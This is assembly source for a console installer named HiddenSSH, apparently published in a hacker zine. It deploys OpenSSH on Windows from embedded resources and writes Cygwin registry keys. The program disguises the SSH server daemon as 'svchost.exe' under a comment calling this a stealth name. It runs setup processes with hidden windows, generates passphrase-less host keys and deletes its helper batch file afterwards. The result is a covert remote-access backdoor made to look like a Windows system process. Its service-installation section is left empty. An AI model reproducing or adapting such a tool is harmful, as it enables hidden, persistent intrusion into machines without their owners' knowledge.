.386
.MODEL flat, stdcall

OPTION CASEMAP:NONE 

Include windows.inc
Include kernel32.inc
Include masm32.inc
include shell32.inc
include advapi32.inc

Includelib advapi32.lib
Includelib shell32.lib
IncludeLib kernel32.lib
IncludeLib masm32.lib

.DATA
; Here we declare all our text variables, statics
sz_Intro1			DB	13,10," **************************************************************** ",\
	                    13,10," *                 HiddenSSH Setup Special Edition              * ",\
	                    13,10," **************************************************************** ",13,10,0
	                    

sz_Intro2			DB  13,10," /** HiddenSSH Installer is a HiddenSetup based on OpenSSH 3.8.1p-1",\
	                    13,10,"     released on 2004-07-09 for Win32.For more informations, visit",\
	                    13,10,"     http://sshwindows.sourceforge.net/",\
	                    13,10,"     Thanks to them, without this project this setup will'nt be here.",\
	                    13,10,\
	                    13,10,"     Coded by Icingtaupe, for n0name mag#1, 100% in MASM.         **/",13,10,0


sz_Install			DB	13,10," Do you want to install OpenSSH (yes/no) ? ",0
sz_QueryPath		DB	" Please enter path where OpenSSH would be installed : ",0
sz_InvalidPath		DB	" Error : Directory cannot be found.",13,10,\
						" Would you like the setup create ",0
sz_Registring		DB	13,10," Writing to registry ... please wait ...",13,10,0
sz_Registre_OK		DB	" Ok, registry's update is done.",13,10,0
sz_SlashAndAsk		DB	" ? ",0
sz_ValidPath		DB	" Ok, directory set.",13,10,0 
sz_DirFailed		DB	" Moving to directory failed. Please enter a valid path.",13,10,0
sz_MovingTo			DB	" Moving to ",0
sz_Creating			DB	" Creating directory ",0
sz_Extracting		DB	" Extracting file ",0
sz_CopyToWin		DB	" Cygwin dll a needed for the server. Do you want to copy",13,10,\
						" them to the System32 directory ? ",0
sz_AllDone			DB	" Ok, all done. Going to run exe files ...",13,10,0
sz_Generating		DB	" Generating public / private keys ( could be long )...",13,10,0
sz_Users			DB	" Adding users & groups ( could be long )...",13,10,0
sz_Service_O		DB	13,10," Ok, Service Install Succeed.",0
sz_Service_F		DB	13,10," Error : Service Install Failed. Please retry.",0
sz_Launch			DB	13,10," Launching Service ",0
sz_Service_Q		DB	13,10," What would be the name of the OpenSSH Service ? ",0
sz_SetupDone		DB	13,10,13,10," Ok ! HiddenSSH Installer has finished his work.",\
						13,10," You should be now able to log into OpenSSH Server with",\
						13,10," password and login you defined or entered before running this setup.",\
						13,10," If you hadn't entered name&login into Windows, please run mkpassd",\
						13,10," and mkgroup again in order to refresh the server. Now, all should be fine.",\
						13,10,13,10," Have a good day,",\
						13,10," Icingtaupe.",13,10,0 
						
sz_OK				DB	"... OK",13,10,0
sz_Failed			DB	"... Failed",13,10,0
sz_AnswerY			DB	"yes",13,10,0
sz_AnswerN			DB	"no",13,10,0
sz_Slash			DB	"\",0
sz_System32			DB	"\System32",0

; OpenSSH folders
sz_Bin				DB	"bin",0
sz_Sbin				DB	"sbin",0
sz_Share			DB	"share",0
sz_TermInfo			DB	"terminfo",0
sz_C				DB	"c",0
sz_Etc				DB	"etc",0
sz_Log				DB	"log",0
sz_Run				DB 	"run",0
sz_Tmp				DB	"tmp",0
sz_Usr				DB	"usr",0
sz_Var				DB	"var",0

; Bin Files
sz_Cygcrypto		DB	"cygcrypto-0.9.7.dll",0
sz_Cygconv			DB	"cygiconv-2.dll",0
sz_Cygminires		DB	"cygminires.dll",0
sz_CygRunSrv		DB	"cygrunsrv.exe",0
sz_cygrunsrv_1		DB	'cygrunsrv.exe -I "',0
sz_cygrunsrv_2		DB	'" -p "/usr/sbin/sshd" -a "-D" --env "CYGWIN=binmode ntsec tty"',0
sz_Cygwin			DB	"cygwin1.dll",0
sz_Cygz				DB	"cygz.dll",0
sz_Last				DB	"last.exe",0
sz_MkGroup			DB	"mkgroup.exe",0
sz_MkPasswd			DB	"mkpasswd.exe",0
sz_MakeAll			DB	"makeall.bat",0
sz_QuietCmd			DB	"quietcmd.bat",0
sz_Scp				DB	"scp.exe",0
sz_Sftp				DB	"sftp.exe",0
sz_Sh				DB	"sh.exe",0
sz_Ssh				DB	"ssh.exe",0    			
sz_Ssh_add			DB	"ssh-add.exe",0
sz_Ssh_agent		DB	"ssh-agent.exe",0
sz_Ssh_keygen		DB	"ssh-keygen.exe ",0
sz_keygen_1			DB	'ssh-keygen.exe -t dsa -f /etc/ssh_host_dsa_key -N "" -q',0
sz_keygen_2			DB	'ssh-keygen.exe -t rsa1 -f /etc/ssh_host_key -N "" -q',0
sz_keygen_3			DB	'ssh-keygen.exe -t rsa -f /etc/ssh_host_rsa_key -N "" -q',0
sz_Ssh_keyscan		DB	"ssh-keyscan.exe",0
sz_Switch			DB	"switch.exe",0

; Sbin files
sz_Sshd				DB	"svchost.exe",0				; Stealth Name for Sshd.exe, the Server Daemon
sz_Sshd_serv			DB	"svchost.exe -D",0
sz_Sftp_serv		DB	"sftp-server.exe",0
sz_Ssh_key			DB 	"ssh-keysign.exe",0

;Share\Terminfo\C File
sz_Cygwin_C			DB	"cygwin",0

;Etc Files
sz_Sshd_config		DB	"sshd_config",0
sz_Ssh_config		DB	"ssh_config",0
sz_Moduli			DB	"moduli",0

;Registry's info
sz_CygKey			DB	"Software\Cygnus Solutions\Cygwin\",0
sz_Mounts			DB	"mounts v2",0
sz_Options			DB	"Program Options",0
sz_Home				DB	"/home",0
sz_Root_key			DB	"/",0
sz_Usr_bin			DB	"/usr/bin",0

sz_Flags_value		DB	0Ah, 00h, 00h ,00h
sz_Flags			DB	"flags",0
sz_Native			DB	"native",0

sz_Blank			DB	" ",0

.DATA?
sz_SlashCleared		DB	250 dup(?)
sz_RootPath			DB	250 dup(?)
sz_WinPath			DB	250 dup(?)
sz_AnswerBuf		DB	250 dup(?)
sz_Path				DB	150 dup(?)
sz_CurrentPath		DB	150 dup(?)



sz_Temp				DB	10 dup(?)


sz_Startup			STARTUPINFO<>
sz_PInfo			PROCESS_INFORMATION<>	
sz_BytesWritten		DD	?
sz_BytesRead		DD	?
sz_Directory		DD ?
sz_File				DD	?
sz_Root				DD	?

hGroup				DD	?
hPasswd				DD	?
hReg_mounts			DD	?
hReg_options		DD	?
hReg_temp			DD	?
hReg				DD	?
hFile				DD 	?
hRes				DD  ?
hTemp				DD  ?

.CODE
Start:
Push OFFSET sz_Intro1 				; From here we display all informations about this program
Call StdOut

Push OFFSET sz_Intro2				
Call StdOut

@Query:
Push OFFSET sz_Install				; Here we display the query sentence ( Do you ? ... ),  and next, we wait for an entry
Call StdOut

Push LENGTHOF sz_AnswerBuf
Push OFFSET sz_AnswerBuf
Call StdIn

Push OFFSET sz_AnswerBuf			; We ask for the length of the answer
Call lstrlen

	.IF EAX > 5						; If the answer if longer than Yes / No, we reset the buffer and re-ask
	Push EAX
	Push OFFSET sz_AnswerBuf
	Call RtlZeroMemory
	
	Jmp @Query
	.ENDIF 

Push OFFSET sz_AnswerY				; We compare the answer to Yes
Push OFFSET sz_AnswerBuf
Call lstrcmpi

	.IF EAX != 0					; If the answer is'nt yes
	Push OFFSET sz_AnswerN			; Compare with "no"
	Push OFFSET sz_AnswerBuf
	Call lstrcmpi
	
 		.IF EAX != 0				; If the answer isn't no ( and isn't yes, as seen above )
 		Push OFFSET sz_AnswerBuf
 		Call lstrlen
 		
	 	Push EAX					; Reset the buffer and re-ask
	 	Push OFFSET sz_AnswerBuf
	 	Call RtlZeroMemory
	 	
	  	Jmp  @Query
	  	
	  	.ELSEIF EAX == 0			; If the answer is no, terminate the program
	  	Jmp @End
	 	.ENDIF
	
	.ELSEIF EAX == 0				; Else, if answer is yes, we go to install procedure
	Call InstallProc
	.ENDIF

@End:
Push 0
Call ExitProcess



InstallProc Proc

	
	@Begin:
	Push OFFSET sz_QueryPath		; Here we ask for the path where OpenSSH wold be installed
	Call StdOut
	
	Push LENGTHOF sz_AnswerBuf		; And we wait for an answer :)
	Push OFFSET sz_AnswerBuf
	Call StdIn
	
	Lea ESI, OFFSET sz_AnswerBuf	; We set adress for AnswerBuf & Path to respectively ESI and EDI registers
	Lea EDI, OFFSET sz_Path
	CLD								; We set the "mode" for LOSDB ( from the beginning of the buffer )
	
	
	@ParsingEngine:					; Start point for Parsing Engine, a bit complicated, but work well :] Thanks to Tolwin for the LODSB tip
	LODSB							; Load byte from ESI ( In fact, AnswerBuf ) in AL
	Cmp  AL,13						; We compare AL to the caracter 13, mean "Enter"
	Jnz  @NotEnter					; If this is not caracter 13, we jump to NotEnter
	Jz   @EnterFound				; Else, if it is, we jump to EnterFound
	
	@NotEnter:						 
	STOSB							; We store the value from AL to EDI ( here, to Path )
	Test AL, AL						; We try to see if this is the end of the string ( If "Test Al, AL" return 0 )
	Jne  @ParsingEngine				; If not, we return to the parsing engine, to see with another caracter
	
	@EnterFound:
	Mov AL, 0						; We move "0", as the end value of the string to AL
	STOSB							; We store AL in EDI, and that's all ! Our path is now clear from "entries" caracters.
	
	Push OFFSET sz_Path
	Call SetCurrentDirectory		; Here we test for the existence of the path supplied
	
	.IF EAX == FALSE 				; If it doesn't exist
	
		@BadPath:
		Push OFFSET sz_InvalidPath	; Hey man, it's not a good path ! The directory doesn't exist ! 
		Call StdOut
		
		Push OFFSET sz_CurrentPath
		Call StdOut
		
		Push OFFSET sz_Path
		Call StdOut
		
		Push OFFSET sz_SlashAndAsk
		Call StdOut
		
		Push LENGTHOF sz_Temp
		Push OFFSET sz_Temp
		Call StdIn					; Wait for a answer for the "We create the folder, or not ?"
		
		Push OFFSET sz_Temp
		Push OFFSET sz_AnswerY
		Call lstrcmpi				; Answer engine
		
		.IF EAX != 0					; If the answer is'nt yes
		Push OFFSET sz_AnswerN			; Compare with "no"
		Push OFFSET sz_Temp
		Call lstrcmpi
		
	 		.IF EAX != 0				; If the answer isn't no ( blablabla ... )
		 	Call CleanMem 	
		  	Jmp  @BadPath
		  	
		  	.ELSEIF EAX == 0			; If the answer is no, we jump to the beginning after cleaned buffers
		  	Call CleanMem
		  	
		  	Jmp  @Begin
		 	.ENDIF
		
		.ELSEIF EAX == 0				; Else, if answer is yes, we just continue :)
			Push OFFSET sz_Path			; We Create the folder indicate by the user's entrie
			Call @CreateDir
			
				.IF EBX == FALSE		; Erf, failed to create directory
				Call CleanMem			; We reset buffers
				Jmp  @BadPath			; We re-ask for a path
				.ENDIF 
				
			Push OFFSET sz_Path			; We go in this directory newly created
			Call SetCurrentDirectory

			Push OFFSET sz_ValidPath	; We say "Hey Ho, we are in the new directory !"
			Call StdOut
			
			Jmp  @CreateFolders			; We jump to the next state :]
		.ENDIF
	
	.ELSEIF EAX == TRUE
		Push OFFSET sz_ValidPath		; Well, folder exist and so we say "It's exist". Clever program, isn't it ?
		Call StdOut
	
	.ENDIF
		
	@CreateFolders:	
	Push OFFSET sz_RootPath				; We get the root path of the OpenSSH System
	Push MAX_PATH
	Call GetCurrentDirectory
	
	; /************************************** Create Basic Folders ***********************************\
	
	Push OFFSET sz_Bin					; We create all folders, in calling "@Createdir" procedure ( "param" = OFFSET sz_Bin ) 
	Call @CreateDir
	
	Push OFFSET sz_Usr					; Create the "usr" folder
	Call @CreateDir
	
	Push OFFSET sz_Tmp					; Blahblah ...
	Call @CreateDir
	
	Push OFFSET sz_Var
	Call @CreateDir
	
	Push OFFSET sz_Etc
	Call @CreateDir
	
	Push OFFSET sz_Bin
	Call ChangeDir
	
	Mov  sz_File, 10					; Here we set the "base" number for the first file, it will be increased in the procedure ( same number as in resources )

	; /************************************** Extract files to Bin ***********************************\
	
	Push OFFSET sz_Cygcrypto			; Give the argument "OFFSET sz_Cygcrypto" to the ExtractFile procedure, and launch here. It will give us the file. :]
	Call ExtractFile
	
	Push OFFSET sz_Cygconv
	Call ExtractFile

	Push OFFSET sz_Cygminires
	Call ExtractFile

	Push OFFSET sz_CygRunSrv
	Call ExtractFile

	Push OFFSET sz_Cygwin
	Call ExtractFile

	Push OFFSET sz_Cygz
	Call ExtractFile
	
	Push OFFSET sz_Last
	Call ExtractFile

	Push OFFSET sz_MkGroup
	Call ExtractFile
	
	Push OFFSET sz_MkPasswd
	Call ExtractFile

	Push OFFSET sz_QuietCmd
	Call ExtractFile
	
	Push OFFSET sz_Scp
	Call ExtractFile

	Push OFFSET sz_Sftp
	Call ExtractFile

	Push OFFSET sz_Sh
	Call ExtractFile

	Push OFFSET sz_Ssh
	Call ExtractFile
	
	Push OFFSET sz_Ssh_add
	Call ExtractFile
	
	Push OFFSET sz_Ssh_agent
	Call ExtractFile
	
	Push OFFSET sz_Ssh_keygen
	Call ExtractFile
	
	Push OFFSET sz_Ssh_keyscan
	Call ExtractFile
	
	Push OFFSET sz_Switch
	Call ExtractFile			; All files have been extracted
	
	Push OFFSET sz_MakeAll
	Call ExtractFile
	
	; /**************************************  Extracting to Usr\Sbin ***********************************\
	
	Mov  sz_Root, 1
	Push OFFSET sz_Usr
	Call ChangeDir
	
	Mov  sz_Root,0
	Push OFFSET sz_Sbin
	Call @CreateDir
	
	Push OFFSET sz_Sbin
	Call ChangeDir
	
	Push OFFSET sz_Sftp_serv
	Call ExtractFile
	
	Push OFFSET sz_Sshd
	Call ExtractFile	
	
	Push OFFSET sz_Ssh_key
	Call ExtractFile
	
	; /**********************************  Create&Extract to Share\Terminfo\c *******************************\
	
	Mov  sz_Root, 1
	Push OFFSET sz_Usr
	Call ChangeDir
	
	Push OFFSET sz_Share
	Call @CreateDir
	
	Mov  sz_Root, 0
	Push OFFSET sz_Share
	Call ChangeDir
	
	Push OFFSET sz_TermInfo
	Call @CreateDir

	Push OFFSET sz_TermInfo
	Call ChangeDir
	
	Push OFFSET sz_C
	Call @CreateDir
	
	Push OFFSET sz_C
	Call ChangeDir
	
	Push OFFSET sz_Cygwin_C
	Call ExtractFile
	
	; /**********************************  Create folders in "Var" *******************************\
	Mov  sz_Root, 1
	Push OFFSET sz_Var
	Call ChangeDir
	
	Mov  sz_Root, 0
	Push OFFSET sz_Log
	Call @CreateDir
	
	Push OFFSET sz_Run
	Call @CreateDir

	; /**********************************  Extract into Etc *******************************\
	
	Mov sz_Root, 1
	Push OFFSET sz_Etc
	Call ChangeDir
	
	Push OFFSET sz_Sshd_config
	Call ExtractFile
	
	Push OFFSET sz_Ssh_config
	Call ExtractFile
	
	Push OFFSET sz_Moduli
	Call ExtractFile

	; /********************** Write informations in registry for Cygwin *************************\
	Push OFFSET sz_Registring
	Call StdOut
	
	Push OFFSET hReg				; Here we create all the keys we need for Cygwin
	Push OFFSET sz_CygKey
	Push HKEY_LOCAL_MACHINE
	Call RegCreateKey
	
	Push OFFSET hReg_mounts
	Push OFFSET sz_Mounts
	Push hReg
	Call RegCreateKey
	
	Push OFFSET hReg_options
	Push OFFSET sz_Options
	Push hReg
	Call RegCreateKey
	
	Push OFFSET hReg_temp			; We now create the key "/"
	Push OFFSET sz_Root_key
	Push hReg_mounts
	Call RegCreateKey			
	
	Push 4							; Write here the "flag" value, with "0000000a" as data ( 4 is the length of data )
	Push OFFSET sz_Flags_value		; The value : 00h ...
	Push REG_DWORD					; Type of key
	Push 0
	Push OFFSET sz_Flags			; Name of value
	Push hReg_temp					; Handle for the key. Here, his name is "temp" because we use the same NAME ( not data ) for differents key, see later
	Call RegSetValueEx				; We write key
	
	Push OFFSET sz_Path				; Calculate the lenght of the string "Path"
	Call lstrlen

	Push EAX						; Use it as the lenght for data of "native" value in "/"
	Push OFFSET sz_Path
	Push REG_SZ
	Push 0
	Push OFFSET sz_Native
	Push hReg_temp
	Call RegSetValueEx
	
	Push 10							; We reset the buffer "hReg_temp", to use it with a different key
	Push OFFSET hReg_temp
	Call RtlZeroMemory

	Push OFFSET hReg_temp			; We now create the key "/usr/bin"
	Push OFFSET sz_Usr_bin
	Push hReg_mounts
	Call RegCreateKey
	
	Push OFFSET sz_RootPath
	Push OFFSET sz_SlashCleared		; We take the Install Path of OpenSSH; and add it to a buffer named SlashCleared 
	Call lstrcat					; Rem : SlashCleared is empty at beginning. We So have : SlashCleeared = "C:\OpenSSH" for example
	
	Push OFFSET sz_Root_key			; We add a Slash to the string
	Push OFFSET sz_SlashCleared		; SlashCleared = C:\OpenSSH/
	Call lstrcat
	
	Push OFFSET sz_Bin				; We add the string "bin" to SlashCleared
	Push OFFSET sz_SlashCleared		; SlashCleared = C:\OpenSSH/bin
	Call lstrcat					; Ok, now our value is ready to be added
	
	Push OFFSET sz_SlashCleared		; We Calculate her length
	Call lstrlen
	
	Push EAX						; Length of data
	Push OFFSET sz_SlashCleared
	Push REG_SZ						; Type of value
	Push 0							; Reserved
	Push OFFSET sz_Native			; Name of Data
	Push hReg_temp					; Handle
	Call RegSetValueEx
	
	Push 4							
	Push OFFSET sz_Flags_value		
	Push REG_DWORD					
	Push 0
	Push OFFSET sz_Flags			
	Push hReg_temp
	Call RegSetValueEx
	
	Push 10							; We reset the buffer "hReg_temp", to use it with a different key
	Push OFFSET hReg_temp
	Call RtlZeroMemory
	
	Push OFFSET hReg_temp			; We now create the key "/usr/bin"
	Push OFFSET sz_Home
	Push hReg_mounts
	Call RegCreateKey
	
	Push 4							
	Push OFFSET sz_Flags_value		
	Push REG_DWORD					
	Push 0
	Push OFFSET sz_Flags			
	Push hReg_temp
	Call RegSetValueEx				; We add a new value, with the habitual 00000a data :]
	
	Push OFFSET sz_Path				; Calculate the lenght of the string "Path"
	Call lstrlen

	Push EAX						; Use it as the lenght for data of "native" value in "/"
	Push OFFSET sz_Path
	Push REG_SZ
	Push 0
	Push OFFSET sz_Native
	Push hReg_temp
	Call RegSetValueEx
	
	Push 1							; We now set the data of the unamed value under "Program Option" to a blank string
	Push OFFSET sz_Blank
	Push REG_SZ
	Push 0
	Push hReg_options
	Call RegSetValue
	
	Push OFFSET sz_Registre_OK		; We say to the user "Hey, registry, it's done !" 
	Call StdOut
	
	@CopyToWin:
	Push OFFSET sz_CopyToWin		; We Say "Do you want to copy to Windows, guy ?"
	Call StdOut
	
	Push 10
	Push OFFSET sz_Temp
	Call RtlZeroMemory				; We reset the buffer for the answer 
	
	Push LENGTHOF sz_Temp
	Push OFFSET sz_Temp
	Call StdIn						; We now wait for an answer for the user ... 
	
	Push OFFSET sz_Temp
	Push OFFSET sz_AnswerY
	Call lstrcmpi					; We compare it to the answer "Yes", followed by the two entries caracters
		.IF EAX != 0
			Push OFFSET sz_Temp		; It's not yes ? So, we compare to no.
			Push OFFSET sz_AnswerN
			Call lstrcmpi
				.IF EAX == 0
				Push 10				; Gosh, answer is no. Ok, we reset the buffer, we say "Ok", and we jump to the next stage
				Push OFFSET sz_Temp
				Call RtlZeroMemory
				
				Push OFFSET sz_AllDone
				Call StdOut
				
				Jmp  @TheLast
				
				.ELSEIF EAX != 0	; Hu, user has entered an incorrect answer. We re-ask.
				Push 10
				Push OFFSET sz_Temp
				Call RtlZeroMemory
				
				Jmp  @CopyToWin
				.ENDIF
		.ELSEIF EAX == 0				; Hu, User has said "yes, I want to copy them !"
		Push MAX_PATH
		Push OFFSET sz_WinPath
		Call GetWindowsDirectory		; So, we get the Windows path
		
		Push OFFSET sz_System32
		Push OFFSET sz_WinPath
		Call lstrcat					; We add the string \system32 to thep ath, and we obtains C:\Windows\System32
		
		Push OFFSET sz_WinPath			; We Set the current directory to the System32 folder
		Call SetCurrentDirectory
		
		Mov sz_File, 10					; We move the value 10 to the variable sz_File
		
		Push OFFSET sz_Cygcrypto		; We extract again all dll
		Call ExtractFile
		
		Push OFFSET sz_Cygconv
		Call ExtractFile
		
		Push OFFSET sz_Cygminires
		Call ExtractFile
		
		Mov sz_File, 14					; Because each resource is associated to a file, we move 14 to "jump" into the file we wanted
		
		Push OFFSET sz_Cygwin
		Call ExtractFile
		
		Push OFFSET sz_Cygz
		Call ExtractFile 
		
		Push OFFSET sz_AllDone			; We say "w00t, it's done !"
		Call StdOut
		.ENDIF
		
	@TheLast:
	Mov  sz_Root,1						; Here is a "Icing's Defined Flag". Procedure check for the value of sz_Root. We set him to 1
	Push OFFSET sz_Bin
	Call ChangeDir						; We now can go into the "bin" directory
	
	Push STD_OUTPUT_HANDLE				; We get the StdOutput handle of our program
	Call GetStdHandle
	Mov  sz_Startup.hStdOutput, EAX		; We set him at the StdOutput of programs we should run
	
	Push STD_INPUT_HANDLE				; same for input :p
	Call GetStdHandle
	Mov  sz_Startup.hStdInput, EAX
	
	Push STD_ERROR_HANDLE				; and for StdError
	Call GetStdHandle
	Mov  sz_Startup.hStdError, EAX
	
	Mov  sz_Startup.dwFlags, STARTF_USESHOWWINDOW+STARTF_USESTDHANDLES ; Here, we say "We have setted different settings. Please use them", for hStdInput/Output and WS_SHOW	
	Mov  sz_Startup.wShowWindow, SW_HIDE 	; Here we say that the process should be hidden
	Mov  sz_Startup.lpReserved, 0
	Mov  sz_Startup.cb, SIZEOF sz_Startup		; we set the size of the structure
	
	Push OFFSET sz_Generating
	Call StdOut								; We say "We are generating keys..."

	Push OFFSET sz_keygen_1					; We run the first keygen mode ( DSA )
	Call RunFile

	Push OFFSET sz_keygen_2					; We run the second keygen mode ( RSA1 )
	Call RunFile

	Push OFFSET sz_keygen_3					; RSA ...
	Call RunFile
	
	Push OFFSET sz_Users					; "Generating users / login" ..
	Call StdOut
	
	Push OFFSET sz_MakeAll					; Run a makeall.bat that contains two commands
	Call RunFile
	
	Push OFFSET sz_MakeAll					; delete the file ( it's now useless )
	Call DeleteFile

	Push 250
	Push OFFSET sz_AnswerBuf
	Call RtlZeroMemory
	
	Push 250
	Push OFFSET sz_SlashCleared
	Call RtlZeroMemory
	
	@AskService:
	Push OFFSET sz_Service_Q
	Call StdOut
	
	Push LENGTHOF sz_AnswerBuf
	Push OFFSET sz_AnswerBuf
	Call StdIn
	
	; ################################ Already explained :p #######################
	
	Lea ESI, OFFSET sz_AnswerBuf	
	Lea EDI, OFFSET sz_SlashCleared
	CLD								
	
	@ParsingEngine_serv:				
	LODSB						
	Cmp  AL,13					
	Jnz  @NotEnter_serv				
	Jz   @EnterFound_serv				
	
	@NotEnter_serv:						 
	STOSB							
	Test AL, AL						
	Jne  @ParsingEngine_serv		
	
	@EnterFound_serv:
	Mov AL, 0						
	STOSB							; So we have Slashcleared with the user answer
	
	Push 250
	Push OFFSET sz_AnswerBuf
	Call RtlZeroMemory
	
	; ############################# Installation du service ####################
	
	
	; ############################# Fun de l'install du service ###############
	
	Push OFFSET sz_SetupDone
	Call StdOut
	
	RET

	
InstallProc EndP

RunFile	proc param:DWORD
	Push OFFSET sz_PInfo
	Push OFFSET sz_Startup
	Push 0
	Push 0
	Push NORMAL_PRIORITY_CLASS
	Push TRUE
	Push 0
	Push 0
	Push param
	Push 0
	Call CreateProcess
	
	Push 3000
	Call Sleep

	RET
RunFile EndP

ExtractFile proc param:DWORD
Push OFFSET sz_Extracting
Call StdOut

	.IF sz_File <=28
	Push OFFSET sz_Bin
	Call StdOut
	
	.ELSEIF sz_File > 29
		.IF sz_File <= 32
		Push OFFSET sz_Sbin
		Call StdOut
		.ELSEIF sz_File == 33
		Push OFFSET sz_C
		Call StdOut
		.ENDIF
	.ENDIF

Push OFFSET sz_Slash
Call StdOut

Push param
Call StdOut

Push 0
Push FILE_ATTRIBUTE_NORMAL
Push CREATE_NEW
Push 0
Push 0
Push GENERIC_READ+GENERIC_WRITE
Push param
Call CreateFile

.IF EAX != INVALID_HANDLE_VALUE
	Mov  hFile, EAX
	
	Push RT_RCDATA
	Push sz_File
	Push 0
	Call FindResource
	
	Mov  hTemp, EAX
	
	Push EAX
	Push 0
	Call LoadResource

	Mov  hRes, EAX
	
	Push hTemp
	Push 0
	Call SizeofResource
	
	Push 0
	Push OFFSET sz_BytesWritten
	Push EAX
	Push hRes
	Push hFile
	Call WriteFile
	
	Push hFile
	Call CloseHandle
	
	Inc  sz_File
	
	Push OFFSET sz_OK
	Call StdOut

	RET
	
.ELSEIF EAX == INVALID_HANDLE_VALUE
	Push OFFSET sz_Failed
	Call StdOut
	
	Push EAX
	Call CloseHandle
	
	Inc  sz_File
	
	RET
.ENDIF
	RET
ExtractFile EndP

@CreateDir proc param:DWORD
Push OFFSET sz_Creating
Call StdOut

Push OFFSET sz_Slash
Call StdOut

Push param
Call StdOut

Push 0
Push param
Call CreateDirectory

.IF EAX == TRUE
Push OFFSET sz_OK
Call StdOut

Push EAX
Call CloseHandle
Ret

.ELSEIF EAX == FALSE
Mov  EBX, EAX
Push OFFSET sz_Failed
Call StdOut

Ret
.ENDIF
@CreateDir endP

CleanMem Proc				; Procedure to clean buffers
Push 150
Push OFFSET sz_Path
Call RtlZeroMemory			; Fill the buffer "sz_Path" with 150 NULL caracters

Push 250
Push OFFSET sz_AnswerBuf
Call RtlZeroMemory			; Bis repetitae ( placent, dedicace to Kinkey :-P )

Push 10
Push OFFSET sz_Temp	
Call RtlZeroMemory			; Same thing as above, but for sz_Temp and with 10 null caracters
	
RET							; we return where we were :]
CleanMem endP

ChangeDir Proc param:DWORD
Push OFFSET sz_MovingTo
Call StdOut

.IF sz_Root == 1
Push OFFSET sz_Path
Call StdOut
.ENDIF

Push OFFSET sz_Slash
Call StdOut

Push param
Call StdOut

	.IF sz_Root == 1
	Push OFFSET sz_RootPath
	Call SetCurrentDirectory
	.ENDIF
Push param
Call SetCurrentDirectory

.IF EAX == TRUE 
Push OFFSET sz_OK
Call StdOut
.ELSEIF EAX == FALSE
Push OFFSET sz_Failed
Call StdOut
.ENDIF
	RET
ChangeDir EndP

End Start


